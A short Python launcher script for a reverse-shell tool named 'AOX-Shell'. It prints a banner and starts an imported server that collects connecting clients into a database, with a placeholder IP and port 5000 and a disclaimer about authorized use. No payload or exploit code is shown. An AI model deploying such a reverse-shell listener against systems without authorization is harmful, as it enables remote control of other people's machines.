# Created by Vasto Boy

# Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

import os
from aox_server import AOXServer



art = """
         █████╗  ██████╗ ██╗  ██╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
        ██╔══██╗██╔═══██╗╚██╗██╔╝     ██╔════╝██║  ██║██╔════╝██║     ██║     
        ███████║██║   ██║ ╚███╔╝█████╗███████╗███████║█████╗  ██║     ██║     
        ██╔══██║██║   ██║ ██╔██╗╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
        ██║  ██║╚██████╔╝██╔╝ ██╗     ███████║██║  ██║███████╗███████╗███████╗
        ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
"""

print(art)


client_folder = "ClientFolder"
aox_server = AOXServer("IP-ADDRESS", 5000, client_folder, "ClientDB.db", "clientDetails")


if not os.path.exists(client_folder):
    os.mkdir(client_folder)


aox_server.print_guide()
aox_server.start()


